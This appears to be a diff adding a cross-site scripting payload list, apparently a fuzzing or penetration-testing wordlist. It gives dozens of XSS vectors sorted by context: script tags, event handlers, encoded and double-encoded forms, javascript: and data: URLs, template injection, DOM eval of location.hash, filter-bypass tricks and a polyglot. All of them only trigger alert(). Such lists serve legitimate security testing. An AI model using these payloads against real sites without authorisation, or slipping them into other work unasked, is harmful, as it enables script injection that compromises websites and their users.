@@ -1,0 +1,97 @@
+# Cross-Site Scripting (XSS) Payloads
+# Various XSS vectors for different contexts
+
+# Basic script tags
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Event handlers
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+
+# Without parentheses
+<img src=x onerror=alert`XSS`>
+<svg onload=alert`1`>
+
+# Without spaces
+<svg/onload=alert('XSS')>
+<img/src=x/onerror=alert('XSS')>
+
+# Encoded payloads
+<script>alert('XSS')</script>
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<script>alert(&#39;XSS&#39;)</script>
+
+# Double encoding
+%253Cscript%253Ealert('XSS')%253C/script%253E
+
+# Unicode encoding
+<script>\u0061lert('XSS')</script>
+<img src=x onerror=\u0061lert('XSS')>
+
+# JavaScript protocol
+<a href="javascript:alert('XSS')">click</a>
+<a href="javascript:alert(1)">XSS</a>
+<iframe src="javascript:alert('XSS')">
+
+# Data protocol
+<a href="data:text/html,<script>alert('XSS')</script>">click</a>
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# SVG payloads
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS')>
+<svg><set onbegin=alert('XSS')>
+
+# Template injection
+{{constructor.constructor('alert(1)')()}}
+${alert('XSS')}
+#{alert('XSS')}
+
+# DOM-based
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>eval(location.hash.slice(1))</script>
+
+# Filter bypass - case variations
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<scRIPT>alert('XSS')</scRIPT>
+
+# Filter bypass - tag variations
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<<script>script>alert('XSS')<</script>/script>
+
+# Filter bypass - null bytes
+<scri%00pt>alert('XSS')</scri%00pt>
+<script%00>alert('XSS')</script>
+
+# Attribute context escapes
+" onmouseover="alert('XSS')
+' onmouseover='alert(1)
+" autofocus onfocus="alert('XSS')
+' autofocus onfocus='alert(1)
+
+# URL context
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+vbscript:alert('XSS')
+
+# CSS context
+<style>*{background:url('javascript:alert(1)')}</style>
+<div style="background:url('javascript:alert(1)')">
+
+# HTML5 vectors
+<details open ontoggle=alert('XSS')>
+<meter onmouseover=alert('XSS')>
+<keygen autofocus onfocus=alert('XSS')>
+
+# Polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
